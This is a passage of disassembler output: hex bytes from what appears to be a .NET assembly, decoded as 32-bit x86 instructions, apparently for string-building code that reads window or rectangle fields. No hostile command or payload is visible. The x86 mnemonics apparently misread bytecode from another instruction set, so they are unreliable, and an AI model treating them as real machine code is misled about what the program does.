  4030f0:	73 58                	jae    0x40314a
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	0a 11                	or     (%ecx),%dl
  4030f6:	06                   	push   %es
  4030f7:	73 58                	jae    0x403151
  4030f9:	00 00                	add    %al,(%eax)
  4030fb:	0a 28                	or     (%eax),%ch
  4030fd:	1c 00                	sbb    $0x0,%al
  4030ff:	00 06                	add    %al,(%esi)
  403101:	26 2b 19             	sub    %es:(%ecx),%ebx
  403104:	07                   	pop    %es
  403105:	20 01                	and    %al,(%ecx)
  403107:	02 00                	add    (%eax),%al
  403109:	00 17                	add    %dl,(%edi)
  40310b:	73 58                	jae    0x403165
  40310d:	00 00                	add    %al,(%eax)
  40310f:	0a 11                	or     (%ecx),%dl
  403111:	06                   	push   %es
  403112:	73 58                	jae    0x40316c
  403114:	00 00                	add    %al,(%eax)
  403116:	0a 28                	or     (%eax),%ch
  403118:	1c 00                	sbb    $0x0,%al
  40311a:	00 06                	add    %al,(%esi)
  40311c:	26 38 be 01 00 00 11 	cmp    %bh,%es:0x11000001(%esi)
  403123:	05 72 a7 04 00       	add    $0x4a772,%eax
  403128:	70 28                	jo     0x403152
  40312a:	11 00                	adc    %eax,(%eax)
  40312c:	00 0a                	add    %cl,(%edx)
  40312e:	16                   	push   %ss
  40312f:	fe 01                	incb   (%ecx)
  403131:	13 11                	adc    (%ecx),%edx
  403133:	11 11                	adc    %edx,(%ecx)
  403135:	2d 1a 07 20 05       	sub    $0x520071a,%eax
  40313a:	02 00                	add    (%eax),%al
  40313c:	00 7e 13             	add    %bh,0x13(%esi)
  40313f:	00 00                	add    %al,(%eax)
  403141:	0a 11                	or     (%ecx),%dl
  403143:	06                   	push   %es
  403144:	73 58                	jae    0x40319e
  403146:	00 00                	add    %al,(%eax)
  403148:	0a 28                	or     (%eax),%ch
  40314a:	1c 00                	sbb    $0x0,%al
  40314c:	00 06                	add    %al,(%esi)
  40314e:	26 2b 18             	sub    %es:(%eax),%ebx
  403151:	07                   	pop    %es
  403152:	20 02                	and    %al,(%edx)
  403154:	02 00                	add    (%eax),%al
  403156:	00 7e 13             	add    %bh,0x13(%esi)
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 11                	or     (%ecx),%dl
  40315d:	06                   	push   %es
  40315e:	73 58                	jae    0x4031b8
  403160:	00 00                	add    %al,(%eax)
  403162:	0a 28                	or     (%eax),%ch
  403164:	1c 00                	sbb    $0x0,%al
  403166:	00 06                	add    %al,(%esi)
  403168:	26 38 72 01          	cmp    %dh,%es:0x1(%edx)
  40316c:	00 00                	add    %al,(%eax)
  40316e:	11 05 72 a7 04 00    	adc    %eax,0x4a772
  403174:	70 28                	jo     0x40319e
  403176:	11 00                	adc    %eax,(%eax)
  403178:	00 0a                	add    %cl,(%edx)
  40317a:	16                   	push   %ss
  40317b:	fe 01                	incb   (%ecx)
  40317d:	13 11                	adc    (%ecx),%edx
  40317f:	11 11                	adc    %edx,(%ecx)
  403181:	2d 35 00 07 20       	sub    $0x20070035,%eax
  403186:	04 02                	add    $0x2,%al
  403188:	00 00                	add    %al,(%eax)
  40318a:	18 73 58             	sbb    %dh,0x58(%ebx)
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a 11                	or     (%ecx),%dl
  403191:	06                   	push   %es
  403192:	73 58                	jae    0x4031ec
  403194:	00 00                	add    %al,(%eax)
  403196:	0a 28                	or     (%eax),%ch
  403198:	1c 00                	sbb    $0x0,%al
  40319a:	00 06                	add    %al,(%esi)
  40319c:	26 07                	es pop %es
  40319e:	20 05 02 00 00 7e    	and    %al,0x7e000002
  4031a4:	13 00                	adc    (%eax),%eax
  4031a6:	00 0a                	add    %cl,(%edx)
  4031a8:	11 06                	adc    %eax,(%esi)
  4031aa:	73 58                	jae    0x403204
  4031ac:	00 00                	add    %al,(%eax)
  4031ae:	0a 28                	or     (%eax),%ch
  4031b0:	1c 00                	sbb    $0x0,%al
  4031b2:	00 06                	add    %al,(%esi)
  4031b4:	26 00 2b             	add    %ch,%es:(%ebx)
  4031b7:	33 00                	xor    (%eax),%eax
  4031b9:	07                   	pop    %es
  4031ba:	20 01                	and    %al,(%ecx)
  4031bc:	02 00                	add    (%eax),%al
  4031be:	00 17                	add    %dl,(%edi)
  4031c0:	73 58                	jae    0x40321a
  4031c2:	00 00                	add    %al,(%eax)
  4031c4:	0a 11                	or     (%ecx),%dl
  4031c6:	06                   	push   %es
  4031c7:	73 58                	jae    0x403221
  4031c9:	00 00                	add    %al,(%eax)
  4031cb:	0a 28                	or     (%eax),%ch
  4031cd:	1c 00                	sbb    $0x0,%al
  4031cf:	00 06                	add    %al,(%esi)
  4031d1:	26 07                	es pop %es
  4031d3:	20 02                	and    %al,(%edx)
  4031d5:	02 00                	add    (%eax),%al
  4031d7:	00 7e 13             	add    %bh,0x13(%esi)
  4031da:	00 00                	add    %al,(%eax)
  4031dc:	0a 11                	or     (%ecx),%dl
  4031de:	06                   	push   %es
  4031df:	73 58                	jae    0x403239
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	0a 28                	or     (%eax),%ch
  4031e5:	1c 00                	sbb    $0x0,%al
  4031e7:	00 06                	add    %al,(%esi)
  4031e9:	26 00 38             	add    %bh,%es:(%eax)
  4031ec:	f0 00 00             	lock add %al,(%eax)
  4031ef:	00 02                	add    %al,(%edx)
  4031f1:	72 b3                	jb     0x4031a6
  4031f3:	04 00                	add    $0x0,%al
  4031f5:	70 16                	jo     0x40320d
  4031f7:	28 0e                	sub    %cl,(%esi)
  4031f9:	00 00                	add    %al,(%eax)
  4031fb:	06                   	push   %es
  4031fc:	13 0a                	adc    (%edx),%ecx
  4031fe:	11 0a                	adc    %ecx,(%edx)
  403200:	2c 0e                	sub    $0xe,%al
  403202:	11 0a                	adc    %ecx,(%edx)
  403204:	16                   	push   %ss
  403205:	30 04 1f             	xor    %al,(%edi,%ebx,1)
  403208:	78 2b                	js     0x403235
  40320a:	02 1f                	add    (%edi),%bl
  40320c:	88 00                	mov    %al,(%eax)
  40320e:	2b 01                	sub    (%ecx),%eax
  403210:	16                   	push   %ss
  403211:	00 13                	add    %dl,(%ebx)
  403213:	0b 11                	or     (%ecx),%edx
  403215:	0b 1f                	or     (%edi),%ebx
  403217:	10 62 13             	adc    %ah,0x13(%edx)
  40321a:	0c 07                	or     $0x7,%al
  40321c:	20 0a                	and    %cl,(%edx)
  40321e:	02 00                	add    (%eax),%al
  403220:	00 11                	add    %dl,(%ecx)
  403222:	0c 73                	or     $0x73,%al
  403224:	58                   	pop    %eax
  403225:	00 00                	add    %al,(%eax)
  403227:	0a 11                	or     (%ecx),%dl
  403229:	09 73 58             	or     %esi,0x58(%ebx)
  40322c:	00 00                	add    %al,(%eax)
  40322e:	0a 28                	or     (%eax),%ch
  403230:	1c 00                	sbb    $0x0,%al
  403232:	00 06                	add    %al,(%esi)
  403234:	26 38 a6 00 00 00 02 	cmp    %ah,%es:0x2000000(%esi)
  40323b:	72 c1                	jb     0x4031fe
  40323d:	04 00                	add    $0x0,%al
  40323f:	70 16                	jo     0x403257
  403241:	28 0e                	sub    %cl,(%esi)
  403243:	00 00                	add    %al,(%eax)
  403245:	06                   	push   %es
  403246:	13 0d 11 0d 16 fe    	adc    0xfe160d11,%ecx
  40324c:	02 16                	add    (%esi),%dl
  40324e:	fe 01                	incb   (%ecx)
  403250:	13 11                	adc    (%ecx),%edx
  403252:	11 11                	adc    %edx,(%ecx)
  403254:	2d 18 07 20 00       	sub    $0x200718,%eax
  403259:	01 00                	add    %eax,(%eax)
  40325b:	00 11                	add    %dl,(%ecx)
  40325d:	0d 73 58 00 00       	or     $0x5873,%eax
  403262:	0a 7e 13             	or     0x13(%esi),%bh
  403265:	00 00                	add    %al,(%eax)
  403267:	0a 28                	or     (%eax),%ch
  403269:	1c 00                	sbb    $0x0,%al
  40326b:	00 06                	add    %al,(%esi)
  40326d:	26 2b 70 02          	sub    %es:0x2(%eax),%esi
  403271:	72 c1                	jb     0x403234
  403273:	04 00                	add    $0x0,%al
  403275:	70 16                	jo     0x40328d
  403277:	28 0e                	sub    %cl,(%esi)
  403279:	00 00                	add    %al,(%eax)
  40327b:	06                   	push   %es
  40327c:	13 0e                	adc    (%esi),%ecx
  40327e:	11 0e                	adc    %ecx,(%esi)
  403280:	16                   	push   %ss
  403281:	fe 02                	incb   (%edx)
  403283:	16                   	push   %ss
  403284:	fe 01                	incb   (%ecx)
  403286:	13 11                	adc    (%ecx),%edx
  403288:	11 11                	adc    %edx,(%ecx)
  40328a:	2d 18 07 20 01       	sub    $0x1200718,%eax
  40328f:	01 00                	add    %eax,(%eax)
  403291:	00 11                	add    %dl,(%ecx)
  403293:	0e                   	push   %cs
  403294:	73 58                	jae    0x4032ee
  403296:	00 00                	add    %al,(%eax)
  403298:	0a 7e 13             	or     0x13(%esi),%bh
  40329b:	00 00                	add    %al,(%eax)
  40329d:	0a 28                	or     (%eax),%ch
  40329f:	1c 00                	sbb    $0x0,%al
  4032a1:	00 06                	add    %al,(%esi)
  4032a3:	26 2b 3a             	sub    %es:(%edx),%edi
  4032a6:	02 72 9d             	add    -0x63(%edx),%dh
  4032a9:	04 00                	add    $0x0,%al
  4032ab:	70 28                	jo     0x4032d5
  4032ad:	0d 00 00 06 13       	or     $0x13060000,%eax
  4032b2:	0f 11 0f             	movups %xmm1,(%edi)
  4032b5:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  4032b9:	0a 13                	or     (%ebx),%dl
  4032bb:	11 11                	adc    %edx,(%ecx)
  4032bd:	11 2d 1e 07 20 02    	adc    %ebp,0x220071e
  4032c3:	01 00                	add    %eax,(%eax)
  4032c5:	00 11                	add    %dl,(%ecx)
  4032c7:	0f 16 6f 59          	movhps 0x59(%edi),%xmm5
  4032cb:	00 00                	add    %al,(%eax)
  4032cd:	0a 73 58             	or     0x58(%ebx),%dh
  4032d0:	00 00                	add    %al,(%eax)
  4032d2:	0a 7e 13             	or     0x13(%esi),%bh
  4032d5:	00 00                	add    %al,(%eax)
  4032d7:	0a 28                	or     (%eax),%ch
  4032d9:	1c 00                	sbb    $0x0,%al
  4032db:	00 06                	add    %al,(%esi)
  4032dd:	26 2b 00             	sub    %es:(%eax),%eax
  4032e0:	2a 00                	sub    (%eax),%al
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	01 10                	add    %edx,(%eax)
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	02 00                	add    (%eax),%al
  4032ea:	38 00                	cmp    %al,(%eax)
  4032ec:	20 58 00             	and    %bl,0x0(%eax)
  4032ef:	14 00                	adc    $0x0,%al
  4032f1:	00 00                	add    %al,(%eax)
  4032f3:	00 1e                	add    %bl,(%esi)
  4032f5:	02 28                	add    (%eax),%ch
  4032f7:	2a 00                	sub    (%eax),%al
  4032f9:	00 0a                	add    %cl,(%edx)
  4032fb:	2a 13                	sub    (%ebx),%dl
  4032fd:	30 04 00             	xor    %al,(%eax,%eax,1)
  403300:	b4 00                	mov    $0x0,%ah
  403302:	00 00                	add    %al,(%eax)
  403304:	0a 00                	or     (%eax),%al
  403306:	00 11                	add    %dl,(%ecx)
  403308:	00 03                	add    %al,(%ebx)
  40330a:	28 17                	sub    %dl,(%edi)
  40330c:	00 00                	add    %al,(%eax)
  40330e:	06                   	push   %es
  40330f:	13 06                	adc    (%esi),%eax
  403311:	11 06                	adc    %eax,(%esi)
  403313:	2d 08 17 13 05       	sub    $0x5131708,%eax
  403318:	38 9c 00 00 00 03 12 	cmp    %bl,0x12030000(%eax,%eax,1)
  40331f:	00 28                	add    %ch,(%eax)
  403321:	19 00                	sbb    %eax,(%eax)
  403323:	00 06                	add    %al,(%esi)
  403325:	13 06                	adc    (%esi),%eax
  403327:	11 06                	adc    %eax,(%esi)
  403329:	2d 08 17 13 05       	sub    $0x5131708,%eax
  40332e:	38 86 00 00 00 20    	cmp    %al,0x20000000(%esi)
  403334:	00 02                	add    %al,(%edx)
  403336:	00 00                	add    %al,(%eax)
  403338:	73 2b                	jae    0x403365
  40333a:	00 00                	add    %al,(%eax)
  40333c:	0a 0b                	or     (%ebx),%cl
  40333e:	03 07                	add    (%edi),%eax
  403340:	07                   	pop    %es
  403341:	6f                   	outsl  %ds:(%esi),(%dx)
  403342:	2c 00                	sub    $0x0,%al
  403344:	00 0a                	add    %cl,(%edx)
  403346:	28 1a                	sub    %bl,(%edx)
  403348:	00 00                	add    %al,(%eax)
  40334a:	06                   	push   %es
  40334b:	26 16                	es push %ss
  40334d:	12 00                	adc    (%eax),%al
  40334f:	7b 2d                	jnp    0x40337e
  403351:	00 00                	add    %al,(%eax)
  403353:	04 12                	add    $0x12,%al
  403355:	00 7b 2b             	add    %bh,0x2b(%ebx)
  403358:	00 00                	add    %al,(%eax)
  40335a:	04 59                	add    $0x59,%al
  40335c:	28 26                	sub    %ah,(%esi)
  40335e:	00 00                	add    %al,(%eax)
  403360:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403363:	12 00                	adc    (%eax),%al
  403365:	7b 2e                	jnp    0x403395
  403367:	00 00                	add    %al,(%eax)
  403369:	04 12                	add    $0x12,%al
  40336b:	00 7b 2c             	add    %bh,0x2c(%ebx)
  40336e:	00 00                	add    %al,(%eax)
  403370:	04 59                	add    $0x59,%al
  403372:	28 26                	sub    %ah,(%esi)
  403374:	00 00                	add    %al,(%eax)
  403376:	0a 0d 02 7b 32 00    	or     0x327b02,%cl
  40337c:	00 04 73             	add    %al,(%ebx,%esi,2)
  40337f:	12 00                	adc    (%eax),%al
  403381:	00 06                	add    %al,(%esi)
  403383:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403386:	04 03                	add    $0x3,%al
  403388:	7d 12                	jge    0x40339c
  40338a:	00 00                	add    %al,(%eax)
  40338c:	04 11                	add    $0x11,%al
  40338e:	04 06                	add    $0x6,%al
  403390:	7d 13                	jge    0x4033a5
  403392:	00 00                	add    %al,(%eax)
  403394:	04 11                	add    $0x11,%al
  403396:	04 07                	add    $0x7,%al
  403398:	6f                   	outsl  %ds:(%esi),(%dx)
  403399:	2d 00 00 0a 7d       	sub    $0x7d0a0000,%eax
  40339e:	14 00                	adc    $0x0,%al
  4033a0:	00 04 11             	add    %al,(%ecx,%edx,1)
  4033a3:	04 08                	add    $0x8,%al
  4033a5:	09 5a 7d             	or     %ebx,0x7d(%edx)
  4033a8:	15 00 00 04 11       	adc    $0x11040000,%eax
  4033ad:	04 6f                	add    $0x6f,%al
  4033af:	2e 00 00             	add    %al,%cs:(%eax)
  4033b2:	0a 00                	or     (%eax),%al
  4033b4:	17                   	pop    %ss
  4033b5:	13 05 2b 00 11 05    	adc    0x511002b,%eax
  4033bb:	2a 1b                	sub    (%ebx),%bl
  4033bd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4033c0:	4d                   	dec    %ebp
  4033c1:	03 00                	add    (%eax),%eax
  4033c3:	00 0b                	add    %cl,(%ebx)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	11 14 13             	adc    %edx,(%ebx,%edx,1)
  4033ca:	0b 73 25             	or     0x25(%ebx),%esi
  4033cd:	00 00                	add    %al,(%eax)
  4033cf:	06                   	push   %es
  4033d0:	13 0c 00             	adc    (%eax,%eax,1),%ecx
  4033d3:	11 0c 73             	adc    %ecx,(%ebx,%esi,2)
  4033d6:	2f                   	das
  4033d7:	00 00                	add    %al,(%eax)
  4033d9:	0a 7d 32             	or     0x32(%ebp),%bh
  4033dc:	00 00                	add    %al,(%eax)
  4033de:	04 7e                	add    $0x7e,%al
  4033e0:	07                   	pop    %es
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	04 7e                	add    $0x7e,%al
  4033e5:	13 00                	adc    (%eax),%eax
  4033e7:	00 0a                	add    %cl,(%edx)
  4033e9:	28 29                	sub    %ch,(%ecx)
  4033eb:	00 00                	add    %al,(%eax)
  4033ed:	0a 16                	or     (%esi),%dl
  4033ef:	fe 01                	incb   (%ecx)
  4033f1:	13 0e                	adc    (%esi),%ecx
  4033f3:	11 0e                	adc    %ecx,(%esi)
  4033f5:	2d 29 00 7e 07       	sub    $0x77e0029,%eax
  4033fa:	00 00                	add    %al,(%eax)
  4033fc:	04 11                	add    $0x11,%al
  4033fe:	0b 2d 11 11 0c fe    	or     0xfe0c1111,%ebp
  403404:	06                   	push   %es
  403405:	26 00 00             	add    %al,%es:(%eax)
  403408:	06                   	push   %es
  403409:	73 1d                	jae    0x403428
  40340b:	00 00                	add    %al,(%eax)
  40340d:	06                   	push   %es
  40340e:	13 0b                	adc    (%ebx),%ecx
  403410:	2b 00                	sub    (%eax),%eax
  403412:	11 0b                	adc    %ecx,(%ebx)
  403414:	7e 13                	jle    0x403429
  403416:	00 00                	add    %al,(%eax)
  403418:	0a 28                	or     (%eax),%ch
  40341a:	16                   	push   %ss
  40341b:	00 00                	add    %al,(%eax)
  40341d:	06                   	push   %es
  40341e:	26 00 16             	add    %dl,%es:(%esi)
  403421:	13 0a                	adc    (%edx),%ecx
  403423:	7e 02                	jle    0x403427
  403425:	00 00                	add    %al,(%eax)
  403427:	04 25                	add    $0x25,%al
  403429:	13 0f                	adc    (%edi),%ecx
  40342b:	12 0a                	adc    (%edx),%cl
  40342d:	28 1b                	sub    %bl,(%ebx)
  40342f:	00 00                	add    %al,(%eax)
  403431:	0a 00                	or     (%eax),%al
  403433:	00 7e 08             	add    %bh,0x8(%esi)
  403436:	00 00                	add    %al,(%eax)
  403438:	04 0a                	add    $0xa,%al
  40343a:	7e 0a                	jle    0x403446
  40343c:	00 00                	add    %al,(%eax)
  40343e:	04 0b                	add    $0xb,%al
  403440:	7e 0c                	jle    0x40344e
  403442:	00 00                	add    %al,(%eax)
  403444:	04 0c                	add    $0xc,%al
  403446:	7e 0d                	jle    0x403455
  403448:	00 00                	add    %al,(%eax)
  40344a:	04 0d                	add    $0xd,%al
  40344c:	7e 0e                	jle    0x40345c
  40344e:	00 00                	add    %al,(%eax)
  403450:	04 13                	add    $0x13,%al
  403452:	04 00                	add    $0x0,%al
  403454:	de 14 11             	ficoms (%ecx,%edx,1)
  403457:	0a 16                	or     (%esi),%dl
  403459:	fe 01                	incb   (%ecx)
  40345b:	13 0e                	adc    (%esi),%ecx
  40345d:	11 0e                	adc    %ecx,(%esi)
  40345f:	2d 08 11 0f 28       	sub    $0x280f1108,%eax
  403464:	1c 00                	sbb    $0x0,%al
  403466:	00 0a                	add    %cl,(%edx)
  403468:	00 dc                	add    %bl,%ah
  40346a:	00 20                	add    %ah,(%eax)
  40346c:	00 10                	add    %dl,(%eax)
  40346e:	00 00                	add    %al,(%eax)
  403470:	73 2b                	jae    0x40349d
  403472:	00 00                	add    %al,(%eax)
  403474:	0a 13                	or     (%ebx),%dl
  403476:	05 11 05 72 d1       	add    $0xd1720511,%eax
  40347b:	04 00                	add    $0x0,%al
  40347d:	70 6f                	jo     0x4034ee
  40347f:	5a                   	pop    %edx
  403480:	00 00                	add    %al,(%eax)
  403482:	0a 26                	or     (%esi),%ah
  403484:	11 05 72 d5 04 00    	adc    %eax,0x4d572
  40348a:	70 6f                	jo     0x4034fb
  40348c:	5a                   	pop    %edx
  40348d:	00 00                	add    %al,(%eax)
  40348f:	0a 06                	or     (%esi),%al
  403491:	7e 13                	jle    0x4034a6
  403493:	00 00                	add    %al,(%eax)
  403495:	0a 28                	or     (%eax),%ch
  403497:	29 00                	sub    %eax,(%eax)
  403499:	00 0a                	add    %cl,(%edx)
  40349b:	2d 07 72 ef 04       	sub    $0x4ef7207,%eax
  4034a0:	00 70 2b             	add    %dh,0x2b(%eax)
  4034a3:	05 72 fb 04 00       	add    $0x4fb72,%eax
  4034a8:	70 00                	jo     0x4034aa
  4034aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4034ab:	5a                   	pop    %edx
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	0a 72 05             	or     0x5(%edx),%dh
  4034b1:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 26                	or     (%esi),%ah
  4034ba:	11 05 72 09 05 00    	adc    %eax,0x50972
  4034c0:	70 6f                	jo     0x403531
  4034c2:	5a                   	pop    %edx
  4034c3:	00 00                	add    %al,(%eax)
  4034c5:	0a 12                	or     (%edx),%dl
  4034c7:	00 72 1f             	add    %dh,0x1f(%edx)
  4034ca:	05 00 70 28 5b       	add    $0x5b287000,%eax
  4034cf:	00 00                	add    %al,(%eax)
  4034d1:	0a 28                	or     (%eax),%ch
  4034d3:	0f 00 00             	sldt   (%eax)
  4034d6:	06                   	push   %es
  4034d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4034d8:	5a                   	pop    %edx
  4034d9:	00 00                	add    %al,(%eax)
  4034db:	0a 72 23             	or     0x23(%edx),%dh
  4034de:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 26                	or     (%esi),%ah
  4034e7:	11 05 72 29 05 00    	adc    %eax,0x52972
  4034ed:	70 6f                	jo     0x40355e
  4034ef:	5a                   	pop    %edx
  4034f0:	00 00                	add    %al,(%eax)
  4034f2:	0a 07                	or     (%edi),%al
  4034f4:	28 0f                	sub    %cl,(%edi)
  4034f6:	00 00                	add    %al,(%eax)
  4034f8:	06                   	push   %es
  4034f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4034fa:	5a                   	pop    %edx
  4034fb:	00 00                	add    %al,(%eax)
  4034fd:	0a 72 23             	or     0x23(%edx),%dh
  403500:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403505:	00 00                	add    %al,(%eax)
  403507:	0a 26                	or     (%esi),%ah
  403509:	11 05 72 3d 05 00    	adc    %eax,0x53d72
  40350f:	70 6f                	jo     0x403580
  403511:	5a                   	pop    %edx
  403512:	00 00                	add    %al,(%eax)
  403514:	0a 08                	or     (%eax),%cl
  403516:	6f                   	outsl  %ds:(%esi),(%dx)
  403517:	5c                   	pop    %esp
  403518:	00 00                	add    %al,(%eax)
  40351a:	0a 72 05             	or     0x5(%edx),%dh
  40351d:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403522:	00 00                	add    %al,(%eax)
  403524:	0a 26                	or     (%esi),%ah
  403526:	11 05 72 4f 05 00    	adc    %eax,0x54f72
  40352c:	70 6f                	jo     0x40359d
  40352e:	5a                   	pop    %edx
  40352f:	00 00                	add    %al,(%eax)
  403531:	0a 09                	or     (%ecx),%cl
  403533:	6f                   	outsl  %ds:(%esi),(%dx)
  403534:	5c                   	pop    %esp
  403535:	00 00                	add    %al,(%eax)
  403537:	0a 72 05             	or     0x5(%edx),%dh
  40353a:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  40353f:	00 00                	add    %al,(%eax)
  403541:	0a 26                	or     (%esi),%ah
  403543:	11 05 72 63 05 00    	adc    %eax,0x56372
  403549:	70 6f                	jo     0x4035ba
  40354b:	5a                   	pop    %edx
  40354c:	00 00                	add    %al,(%eax)
  40354e:	0a 12                	or     (%edx),%dl
  403550:	04 72                	add    $0x72,%al
  403552:	71 05                	jno    0x403559
  403554:	00 70 28             	add    %dh,0x28(%eax)
  403557:	5d                   	pop    %ebp
  403558:	00 00                	add    %al,(%eax)
  40355a:	0a 28                	or     (%eax),%ch
  40355c:	5e                   	pop    %esi
  40355d:	00 00                	add    %al,(%eax)
  40355f:	0a 6f 5a             	or     0x5a(%edi),%ch
  403562:	00 00                	add    %al,(%eax)
  403564:	0a 72 05             	or     0x5(%edx),%dh
  403567:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  40356c:	00 00                	add    %al,(%eax)
  40356e:	0a 26                	or     (%esi),%ah
  403570:	11 05 72 79 05 00    	adc    %eax,0x57972
  403576:	70 6f                	jo     0x4035e7
  403578:	5a                   	pop    %edx
  403579:	00 00                	add    %al,(%eax)
  40357b:	0a 26                	or     (%esi),%ah
  40357d:	16                   	push   %ss
  40357e:	13 06                	adc    (%esi),%eax
  403580:	38 5c 01 00          	cmp    %bl,0x0(%ecx,%eax,1)
  403584:	00 00                	add    %al,(%eax)
  403586:	11 0c 7b             	adc    %ecx,(%ebx,%edi,2)
  403589:	32 00                	xor    (%eax),%al
  40358b:	00 04 11             	add    %al,(%ecx,%edx,1)
  40358e:	06                   	push   %es
  40358f:	6f                   	outsl  %ds:(%esi),(%dx)
  403590:	5f                   	pop    %edi
  403591:	00 00                	add    %al,(%eax)
  403593:	0a 13                	or     (%ebx),%dl
  403595:	07                   	pop    %es
  403596:	11 06                	adc    %eax,(%esi)
  403598:	16                   	push   %ss
  403599:	fe 01                	incb   (%ecx)
  40359b:	13 0e                	adc    (%esi),%ecx
  40359d:	11 0e                	adc    %ecx,(%esi)
  40359f:	2d 0d 11 05 72       	sub    $0x7205110d,%eax
  4035a4:	05 05 00 70 6f       	add    $0x6f700005,%eax
  4035a9:	5a                   	pop    %edx
  4035aa:	00 00                	add    %al,(%eax)
  4035ac:	0a 26                	or     (%esi),%ah
  4035ae:	11 07                	adc    %eax,(%edi)
  4035b0:	7c 13                	jl     0x4035c5
  4035b2:	00 00                	add    %al,(%eax)
  4035b4:	04 7b                	add    $0x7b,%al
  4035b6:	2d 00 00 04 11       	sub    $0x11040000,%eax
  4035bb:	07                   	pop    %es
  4035bc:	7c 13                	jl     0x4035d1
  4035be:	00 00                	add    %al,(%eax)
  4035c0:	04 7b                	add    $0x7b,%al
  4035c2:	2b 00                	sub    (%eax),%eax
  4035c4:	00 04 59             	add    %al,(%ecx,%ebx,2)
  4035c7:	13 08                	adc    (%eax),%ecx
  4035c9:	11 07                	adc    %eax,(%edi)
  4035cb:	7c 13                	jl     0x4035e0
  4035cd:	00 00                	add    %al,(%eax)
  4035cf:	04 7b                	add    $0x7b,%al
  4035d1:	2e 00 00             	add    %al,%cs:(%eax)
  4035d4:	04 11                	add    $0x11,%al
  4035d6:	07                   	pop    %es
  4035d7:	7c 13                	jl     0x4035ec
  4035d9:	00 00                	add    %al,(%eax)
  4035db:	04 7b                	add    $0x7b,%al
  4035dd:	2c 00                	sub    $0x0,%al
  4035df:	00 04 59             	add    %al,(%ecx,%ebx,2)
  4035e2:	13 09                	adc    (%ecx),%ecx
  4035e4:	11 05 72 d1 04 00    	adc    %eax,0x4d172
  4035ea:	70 6f                	jo     0x40365b
  4035ec:	5a                   	pop    %edx
  4035ed:	00 00                	add    %al,(%eax)
  4035ef:	0a 26                	or     (%esi),%ah
  4035f1:	11 05 72 91 05 00    	adc    %eax,0x59172
  4035f7:	70 6f                	jo     0x403668
  4035f9:	5a                   	pop    %edx
  4035fa:	00 00                	add    %al,(%eax)
  4035fc:	0a 11                	or     (%ecx),%dl
  4035fe:	07                   	pop    %es
  4035ff:	7c 12                	jl     0x403613
  403601:	00 00                	add    %al,(%eax)
  403603:	04 72                	add    $0x72,%al
  403605:	1f                   	pop    %ds
  403606:	05 00 70 28 5b       	add    $0x5b287000,%eax
  40360b:	00 00                	add    %al,(%eax)
  40360d:	0a 28                	or     (%eax),%ch
  40360f:	0f 00 00             	sldt   (%eax)
  403612:	06                   	push   %es
  403613:	6f                   	outsl  %ds:(%esi),(%dx)
  403614:	5a                   	pop    %edx
  403615:	00 00                	add    %al,(%eax)
  403617:	0a 72 23             	or     0x23(%edx),%dh
  40361a:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  40361f:	00 00                	add    %al,(%eax)
  403621:	0a 26                	or     (%esi),%ah
  403623:	11 05 72 29 05 00    	adc    %eax,0x52972
  403629:	70 6f                	jo     0x40369a
  40362b:	5a                   	pop    %edx
  40362c:	00 00                	add    %al,(%eax)
  40362e:	0a 11                	or     (%ecx),%dl
  403630:	07                   	pop    %es
  403631:	7b 14                	jnp    0x403647
  403633:	00 00                	add    %al,(%eax)
  403635:	04 28                	add    $0x28,%al
  403637:	0f 00 00             	sldt   (%eax)
  40363a:	06                   	push   %es
  40363b:	6f                   	outsl  %ds:(%esi),(%dx)
  40363c:	5a                   	pop    %edx
  40363d:	00 00                	add    %al,(%eax)
  40363f:	0a 72 23             	or     0x23(%edx),%dh
  403642:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  403647:	00 00                	add    %al,(%eax)
  403649:	0a 26                	or     (%esi),%ah
  40364b:	11 05 72 a3 05 00    	adc    %eax,0x5a372
  403651:	70 6f                	jo     0x4036c2
  403653:	5a                   	pop    %edx
  403654:	00 00                	add    %al,(%eax)
  403656:	0a 11                	or     (%ecx),%dl
  403658:	07                   	pop    %es
  403659:	7c 13                	jl     0x40366e
  40365b:	00 00                	add    %al,(%eax)
  40365d:	04 7b                	add    $0x7b,%al
  40365f:	2b 00                	sub    (%eax),%eax
  403661:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403664:	5c                   	pop    %esp
  403665:	00 00                	add    %al,(%eax)
  403667:	0a 72 05             	or     0x5(%edx),%dh
  40366a:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
  40366f:	00 00                	add    %al,(%eax)
  403671:	0a 26                	or     (%esi),%ah
  403673:	11 05 72 ad 05 00    	adc    %eax,0x5ad72
  403679:	70 6f                	jo     0x4036ea
  40367b:	5a                   	pop    %edx
  40367c:	00 00                	add    %al,(%eax)
  40367e:	0a 11                	or     (%ecx),%dl
  403680:	07                   	pop    %es
  403681:	7c 13                	jl     0x403696
  403683:	00 00                	add    %al,(%eax)
  403685:	04 7b                	add    $0x7b,%al
  403687:	2c 00                	sub    $0x0,%al
  403689:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40368c:	5c                   	pop    %esp
  40368d:	00 00                	add    %al,(%eax)
  40368f:	0a 72 05             	or     0x5(%edx),%dh
  403692:	05 00 70 6f 5a       	add    $0x5a6f7000,%eax
